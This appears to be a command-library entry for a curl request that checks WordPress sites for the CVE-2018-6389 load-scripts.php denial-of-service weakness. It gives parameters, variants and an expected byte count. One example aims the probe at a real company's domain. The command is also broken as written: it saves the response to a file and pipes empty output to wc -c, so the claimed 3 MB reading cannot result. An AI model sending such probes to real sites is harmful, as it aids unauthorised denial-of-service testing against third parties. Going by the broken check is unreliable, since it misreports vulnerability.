---
data: >-
  curl -s -o response.js
  "https://target.com/wp-admin/load-scripts.php?load=eutil,common,jquery,thickbox,shortcode,media-upload,svg-painter,jquery-ui-core,jquery-ui-widget,jquery-ui-button,jquery-ui-slider,jquery-ui-mouse,jquery-ui-dialog"
  | wc -c
tags:
  - dos
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:55.847Z'
id: 6731d61c-febf-400e-8082-adda316ae0dc
verified: false
validated: true
submitted: true
---
# curl-load-scripts-dos

## Command

```bash
curl -s -o response.js "https://target.com/wp-admin/load-scripts.php?load=eutil,common,jquery,thickbox,shortcode,media-upload,svg-painter,jquery-ui-core,jquery-ui-widget,jquery-ui-button,jquery-ui-slider,jquery-ui-mouse,jquery-ui-dialog" | wc -c
```

## Description

This command uses curl to send a GET request to the WordPress load-scripts.php endpoint with a 'load' parameter containing multiple script handles, simulating CVE-2018-6389 exploitation. It silently downloads the response to response.js and pipes to wc -c to output the byte size, verifying if the endpoint generates a large (~3MB) concatenated JavaScript file without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, no progress meter | Yes |
| `-o response.js` | Output file for the response | Yes |
| URL | Target endpoint with load parameter | Yes |
| `| wc -c` | Pipe to count bytes | Yes |

## Examples

### Basic Usage

```bash
curl -s -o response.js "https://nordvpn.com/wp-admin/load-scripts.php?load=eutil,common,jquery" | wc -c
```

### Advanced Usage

```bash
curl -s -H "User-Agent: Mozilla/5.0" -o full-response.js "https://target.com/wp-admin/load-scripts.php?load=[full list of 20+ handles]" | wc -c
```

## Expected Output

A number representing the response size in bytes, e.g., 3145728, indicating a large file download confirming vulnerability.

## Related

- [[Related Procedure|Verify-Load-Scripts-Endpoint-on-Target]]
